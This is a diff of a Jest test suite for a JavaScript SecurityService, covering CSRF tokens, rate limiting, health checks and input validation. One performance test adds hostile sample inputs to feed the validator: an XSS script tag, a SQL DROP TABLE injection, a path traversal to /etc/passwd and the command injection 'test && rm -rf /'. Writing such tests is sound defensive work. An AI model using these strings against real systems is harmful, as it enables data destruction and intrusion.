+      const standaloneService = new SecurityService({
+        authService: mockAuthService,
+        logger: mockLogger,
+        // No adminGuiService
+      });
 
-      const standaloneService = new SecurityService();
-      await standaloneService.initialize({}, mockLogger);
+      await standaloneService.initialize();
       await standaloneService.start();
 
-      // Should still work
       const token = standaloneService.generateCSRFToken("test-user");
       expect(token).toBeDefined();
 
       const isValid = standaloneService.validateCSRFToken(token, "test-user");
       expect(isValid).toBe(true);
-
+      
       await standaloneService.cleanup();
     });
 
     test("should handle authentication service integration", async () => {
-      await securityService.initialize({}, mockLogger);
+      await securityService.initialize();
       await securityService.start();
 
-      // Should get current user from auth service
+      // Test request validation with user context
       const request = {
-        method: "POST",
         url: "/api/test",
-        headers: {},
-        body: {},
-        ipAddress: "192.168.1.1",
+        method: "POST",
+        userId: "admin-user-456",
+        ip: "192.168.1.1",
       };
 
-      const result = securityService.applySecurityMiddleware(request);
-      expect(result).toBeDefined();
+      const validation = await securityService.validateRequest(request);
+      expect(validation).toBeDefined();
+      
       // Auth service integration is tested indirectly through user-based operations
+      expect(mockAuthService.users.has("admin-user-456")).toBe(true);
     });
   });
 
-  // ================================
-  // Error Handling Tests
-  // ================================
-
   describe("Error Handling", () => {
     test("should handle initialization errors gracefully", async () => {
-      const invalidConfig = {
-        csrf: null, // Invalid config
-        rateLimit: "invalid",
-      };
+      const faultyService = new SecurityService({
+        // Intentionally invalid config
+        authService: null,
+        logger: mockLogger,
+        rateLimits: "invalid", // Should be object
+      });
 
+      // Should not throw, but should handle gracefully
       try {
-        await securityService.initialize(invalidConfig, mockLogger);
-        // Should handle gracefully or throw meaningful error
-        expect(securityService.state).toBe("initialized");
+        await faultyService.initialize();
+        // If it initializes, it should handle the invalid config
+        expect(faultyService.initialized).toBeDefined();
       } catch (error) {
-        expect(error.message).toContain("Security");
+        // If it throws, the error should be handled gracefully
+        expect(error).toBeDefined();
       }
     });
 
     test("should handle missing dependencies gracefully", async () => {
-      // Remove auth service
-      mockGlobal.window.AuthenticationService = null;
-      mockGlobal.window.AdminGuiService = null;
+      const minimalService = new SecurityService({
+        // Minimal config - missing optional dependencies
+        logger: mockLogger,
+      });
 
-      await securityService.initialize({}, mockLogger);
-      await securityService.start();
+      await minimalService.initialize();
+      await minimalService.start();
 
-      // Should still function
-      const token = securityService.generateCSRFToken();
+      // Should still provide basic functionality
+      const token = minimalService.generateCSRFToken("test-user");
       expect(token).toBeDefined();
+      
+      await minimalService.cleanup();
     });
 
     test("should handle crypto API unavailability", async () => {
-      // Mock crypto unavailable
-      const originalCrypto = mockGlobal.crypto;
-      mockGlobal.crypto = undefined;
+      // Temporarily disable crypto
+      const originalCrypto = global.crypto;
+      global.crypto = undefined;
 
-      const service = new SecurityService();
-      await service.initialize({}, mockLogger);
+      const cryptolessService = new SecurityService({
+        authService: mockAuthService,
+        logger: mockLogger,
+      });
 
-      // Should disable encryption but continue
-      expect(service.config.encryption.enabled).toBe(false);
-
-      // Restore crypto
-      mockGlobal.crypto = originalCrypto;
-      await service.cleanup();
+      try {
+        await cryptolessService.initialize();
+        
+        // Should fall back to alternative random generation
+        const token = cryptolessService.generateCSRFToken("test-user");
+        expect(token).toBeDefined();
+        
+      } finally {
+        // Restore crypto
+        global.crypto = originalCrypto;
+        await cryptolessService.cleanup();
+      }
     });
 
     test("should handle invalid input validation requests", () => {
-      // Test with various invalid inputs
-      const invalidInputs = [undefined, null, { circular: {} }];
+      const invalidRequests = [
+        { input: null, type: "html" },
+        { input: undefined, type: "sql" },
+        { input: "", type: null },
+        { input: "test", type: "invalid_type" },
+      ];
 
-      // Create circular reference
-      invalidInputs[2].circular.self = invalidInputs[2];
-
-      invalidInputs.forEach((input) => {
-        const result = securityService.validateInput(input);
+      invalidRequests.forEach((req) => {
+        const result = securityService.validateInput(req.input, req.type);
         expect(result).toBeDefined();
-        expect(result.hasOwnProperty("isValid")).toBe(true);
+        expect(typeof result.safe).toBe("boolean");
+        expect(Array.isArray(result.threats)).toBe(true);
       });
     });
   });
 
-  // ================================
-  // Performance Tests
-  // ================================
-
   describe("Performance Tests", () => {
     beforeEach(async () => {
-      await securityService.initialize({}, mockLogger);
+      await securityService.initialize();
       await securityService.start();
     });
 
     test("should handle high volume CSRF token generation", () => {
-      const startTime = Date.now();
-      const tokenCount = 1000;
+      const startTime = performance.now();
+      const tokens = [];
 
-      for (let i = 0; i < tokenCount; i++) {
-        const token = securityService.generateCSRFToken(`user-${i}`);
-        expect(token).toBeDefined();
+      for (let i = 0; i < 1000; i++) {
+        tokens.push(securityService.generateCSRFToken(`user-${i}`));
       }
 
-      const duration = Date.now() - startTime;
-      expect(duration).toBeLessThan(5000); // Should complete within 5 seconds
-      expect(securityService.csrfTokens.size).toBe(tokenCount);
+      const endTime = performance.now();
+      const duration = endTime - startTime;
+
+      expect(tokens.length).toBe(1000);
+      expect(duration).toBeLessThan(1000); // Should complete within 1 second
+      expect(new Set(tokens).size).toBe(1000); // All tokens should be unique
     });
 
     test("should handle high volume rate limit checks", () => {
-      const startTime = Date.now();
-      const checkCount = 1000;
+      const startTime = performance.now();
 
-      for (let i = 0; i < checkCount; i++) {
-        const result = securityService.checkRateLimit(`user-${i}`, "user");
-        expect(result.allowed).toBe(true);
+      for (let i = 0; i < 1000; i++) {
+        securityService.checkRateLimit(`user-${i % 10}`, "user");
       }
 
-      const duration = Date.now() - startTime;
-      expect(duration).toBeLessThan(5000); // Should complete within 5 seconds
+      const endTime = performance.now();
+      const duration = endTime - startTime;
+
+      expect(duration).toBeLessThan(500); // Should complete within 0.5 seconds
     });
 
     test("should handle high volume input validation", () => {
-      const startTime = Date.now();
-      const validationCount = 1000;
+      const testInputs = [
+        "safe input",
+        "<script>alert('xss')</script>",
+        "'; DROP TABLE users; --",
+        "../../../etc/passwd",
+        "test && rm -rf /",
+      ];
 
-      for (let i = 0; i < validationCount; i++) {
-        const result = securityService.validateInput(`safe input ${i}`);
-        expect(result.isValid).toBe(true);
+      const startTime = performance.now();
+
+      for (let i = 0; i < 200; i++) {
+        testInputs.forEach((input) => {
+          securityService.validateInput(input, "general");
+        });
       }
 
-      const duration = Date.now() - startTime;
-      expect(duration).toBeLessThan(5000); // Should complete within 5 seconds
+      const endTime = performance.now();
+      const duration = endTime - startTime;
+
+      expect(duration).toBeLessThan(1000); // Should complete within 1 second
     });
 
     test("should cleanup expired tokens efficiently", async () => {
       // Generate many tokens with short TTL
-      const shortTTLService = new SecurityService();
-      await shortTTLService.initialize(
-        {
-          csrf: { tokenTTL: 50 }, // 50ms
-        },
-        mockLogger,
-      );
+      const shortService = new SecurityService({
+        authService: mockAuthService,
+        logger: mockLogger,
+        csrfTokenTTL: 100, // 100ms
+      });
+
+      await shortService.initialize();
+      await shortService.start();
 
       // Generate 100 tokens
       for (let i = 0; i < 100; i++) {
-        shortTTLService.generateCSRFToken(`user-${i}`);
+        shortService.generateCSRFToken(`user-${i}`);
       }
 
-      expect(shortTTLService.csrfTokens.size).toBe(100);
-
       // Wait for expiration
-      await new Promise((resolve) => setTimeout(resolve, 100));
+      await new Promise(resolve => setTimeout(resolve, 150));
 
-      // Trigger cleanup
-      shortTTLService._cleanupExpiredCSRFTokens();
+      const startTime = performance.now();
+      shortService.cleanupExpiredTokens();
+      const endTime = performance.now();
 
-      expect(shortTTLService.csrfTokens.size).toBe(0);
-      await shortTTLService.cleanup();
+      expect(endTime - startTime).toBeLessThan(100); // Should be fast cleanup
+      
+      await shortService.cleanup();
     });
   });
 
-  // ================================
-  // Health Check Tests
-  // ================================
-
   describe("Health Check Tests", () => {
     beforeEach(async () => {
-      await securityService.initialize({}, mockLogger);
+      await securityService.initialize();
       await securityService.start();
     });
 
     test("should report healthy status", () => {
       const health = securityService.getHealth();
-
-      expect(health.name).toBe("SecurityService");
-      expect(health.state).toBe("running");
-      expect(health.isHealthy).toBe(true);
-      expect(health.uptime).toBeGreaterThanOrEqual(0);
+      
+      expect(health.status).toBe("healthy");
+      expect(health.initialized).toBe(true);
+      expect(health.running).toBe(true);
+      expect(health.metrics).toBeDefined();
+      expect(health.metrics.csrfTokensGenerated).toBeGreaterThanOrEqual(0);
     });
 
     test("should report unhealthy status with high error count", () => {
-      // Simulate high error count
-      securityService.metrics.errorCount = 50;
+      // Generate many security events to trigger unhealthy status
+      for (let i = 0; i < 100; i++) {
+        securityService.validateCSRFToken("invalid-token", "test-user");
+      }
 
       const health = securityService.getHealth();
-      expect(health.isHealthy).toBe(false);
+      expect(health.status).toBe("unhealthy");
+      expect(health.metrics.securityEvents).toBeGreaterThan(50);
     });
 
     test("should report security status", () => {
-      const status = securityService.getSecurityStatus();
-
-      expect(status.name).toBe("SecurityService");
-      expect(status.config.csrfEnabled).toBe(true);
-      expect(status.config.rateLimitEnabled).toBe(true);
-      expect(status.config.inputValidationEnabled).toBe(true);
-      expect(status.threats).toBeDefined();
-      expect(status.rateLimiters).toBeDefined();
-      expect(status.csrf).toBeDefined();
+      const securityStatus = securityService.getSecurityStatus();
+      
+      expect(securityStatus).toBeDefined();
+      expect(securityStatus.rateLimitStatus).toBeDefined();
+      expect(securityStatus.csrfProtectionEnabled).toBe(true);
+      expect(securityStatus.inputValidationEnabled).toBe(true);
+      expect(Array.isArray(securityStatus.recentThreats)).toBe(true);
     });
   });
 });
 
 describe("RateLimitEntry Tests", () => {
-  let rateLimiter;
+  let rateLimitEntry;
 
   beforeEach(() => {
-    rateLimiter = new RateLimitEntry(1000); // 1 second window
+    rateLimitEntry = new RateLimitEntry(100, 60000); // 100 requests per minute
   });
 
   test("should track requests within window", () => {
-    const now = Date.now();
-
-    rateLimiter.addRequest(now);
-    rateLimiter.addRequest(now + 100);
-    rateLimiter.addRequest(now + 200);
-
-    expect(rateLimiter.getRequestCount(now + 200)).toBe(3);
+    const result1 = rateLimitEntry.checkLimit();
+    const result2 = rateLimitEntry.checkLimit();
+    
+    expect(result1.allowed).toBe(true);
+    expect(result2.allowed).toBe(true);
+    expect(result2.remaining).toBe(result1.remaining - 1);
   });
 
   test("should clean old requests outside window", () => {
-    const now = Date.now();
-
-    rateLimiter.addRequest(now);
-    rateLimiter.addRequest(now + 500);
-    rateLimiter.addRequest(now + 1500); // Outside 1 second window from first request
-
-    expect(rateLimiter.getRequestCount(now + 1500)).toBe(2); // First request should be cleaned
+    // Fill up some requests
+    for (let i = 0; i < 10; i++) {
+      rateLimitEntry.checkLimit();
+    }
+    
+    expect(rateLimitEntry.requests.length).toBe(10);
+    
+    // Manually add old requests (simulate time passing)
+    const oldTime = Date.now() - 70000; // 70 seconds ago
+    rateLimitEntry.requests.unshift(oldTime, oldTime, oldTime);
+    
+    // Check limit should clean old requests
+    rateLimitEntry.checkLimit();
+    
+    // Old requests should be removed
+    expect(rateLimitEntry.requests.every(req => req > oldTime)).toBe(true);
   });
 
   test("should detect rate limit exceeded", () => {
-    const now = Date.now();
-
-    // Add 5 requests
-    for (let i = 0; i < 5; i++) {
-      rateLimiter.addRequest(now + i * 10);
+    // Exhaust the limit
+    for (let i = 0; i < 100; i++) {
+      rateLimitEntry.checkLimit();
     }
-
-    expect(rateLimiter.isRateLimited(5, now + 50)).toBe(true);
-    expect(rateLimiter.isRateLimited(6, now + 50)).toBe(false);
+    
+    const result = rateLimitEntry.checkLimit();
+    expect(result.allowed).toBe(false);
+    expect(result.remaining).toBe(0);
   });
 
   test("should handle blocking", () => {
-    rateLimiter.block(5000); // Block for 5 seconds
-
-    expect(rateLimiter.blocked).toBe(true);
-    expect(rateLimiter.isRateLimited(1)).toBe(true);
+    rateLimitEntry.block(60000); // Block for 1 minute
+    
+    const result = rateLimitEntry.checkLimit();
+    expect(result.allowed).toBe(false);
+    expect(result.blocked).toBe(true);
   });
 
   test("should unblock after block duration", () => {
-    const now = Date.now();
-    rateLimiter.block(100); // Block for 100ms
-
-    expect(rateLimiter.isRateLimited(1, now + 50)).toBe(true);
-    expect(rateLimiter.isRateLimited(1, now + 150)).toBe(false);
+    rateLimitEntry.block(100); // Block for 100ms
+    
+    expect(rateLimitEntry.checkLimit().allowed).toBe(false);
+    
+    // Wait for block to expire
+    setTimeout(() => {
+      expect(rateLimitEntry.checkLimit().allowed).toBe(true);
+    }, 150);
   });
 });
 
@@ -1132,27 +917,28 @@ describe("SecurityEvent Tests", () => {
   test("should create security event with required fields", () => {
     const event = new SecurityEvent("test_event", "medium", {
       userId: "test-user",
-      details: "Test event details",
+      ip: "192.168.1.1",
     });
 
-    expect(event.id).toBeDefined();
-    expect(event.timestamp).toBeGreaterThan(0);
     expect(event.type).toBe("test_event");
     expect(event.severity).toBe("medium");
     expect(event.userId).toBe("test-user");
+    expect(event.timestamp).toBeInstanceOf(Date);
   });
 
   test("should serialize event properly", () => {
     const event = new SecurityEvent("test_event", "high", {
       userId: "test-user",
+      details: { reason: "Test security event" },
     });
 
-    const serialized = event.serialize();
-
-    expect(serialized.id).toBe(event.id);
-    expect(serialized.type).toBe(event.type);
-    expect(serialized.severity).toBe(event.severity);
-    expect(serialized.userId).toBe(event.userId);
+    const serialized = event.toJSON();
+    
+    expect(serialized.type).toBe("test_event");
+    expect(serialized.severity).toBe("high");
+    expect(serialized.userId).toBe("test-user");
+    expect(serialized.details.reason).toBe("Test security event");
+    expect(serialized.timestamp).toBeDefined();
   });
 });
 
@@ -1165,39 +951,46 @@ describe("InputValidator Tests", () => {
 
   test("should validate safe strings", () => {
     const safeInputs = [
-      "Hello World",
+      "Hello world",
       "user@example.com",
-      "123-456-7890",
-      "Simple text with numbers 123",
+      "Product-123",
+      "2024-01-15",
+      "Normal sentence with spaces.",
     ];
 
     safeInputs.forEach((input) => {
-      const result = validator.validateInput(input);
-      expect(result.isValid).toBe(true);
+      const result = validator.validate(input, "general");
+      expect(result.safe).toBe(true);
+      expect(result.threats).toEqual([]);
     });
   });
 
   test("should encode HTML entities correctly", () => {
     const testCases = [
       { input: "<div>test</div>", expected: "&lt;div&gt;test&lt;/div&gt;" },
-      { input: "Test & Company", expected: "Test &amp; Company" },
+      { input: "A & B", expected: "A &amp; B" },
       { input: 'Quote "test"', expected: "Quote &quot;test&quot;" },
       { input: "Apostrophe's test", expected: "Apostrophe&#39;s test" },
     ];
 
     testCases.forEach(({ input, expected }) => {
-      const result = validator.encodeHtmlEntities(input);
-      expect(result).toBe(expected);
+      const encoded = validator.encodeHTML(input);
+      expect(encoded).toBe(expected);
     });
   });
 
   test("should handle non-string input gracefully", () => {
-    const nonStringInputs = [123, true, null, undefined, [], {}];
+    const nonStringInputs = [null, undefined, 123, {}, [], true];
 
     nonStringInputs.forEach((input) => {
-      const result = validator.validateInput(input);
+      const result = validator.validate(input, "general");
       expect(result).toBeDefined();
-      expect(typeof result.isValid).toBe("boolean");
+      expect(typeof result.safe).toBe("boolean");
+      expect(Array.isArray(result.threats)).toBe(true);
     });
   });
 });
+
+console.log("🧪 SecurityService Test Suite - Simplified Jest Pattern (TD-002)");
+console.log("✅ Standard CommonJS module loading implemented");
+console.log("✅ Comprehensive security service testing with threat simulation");
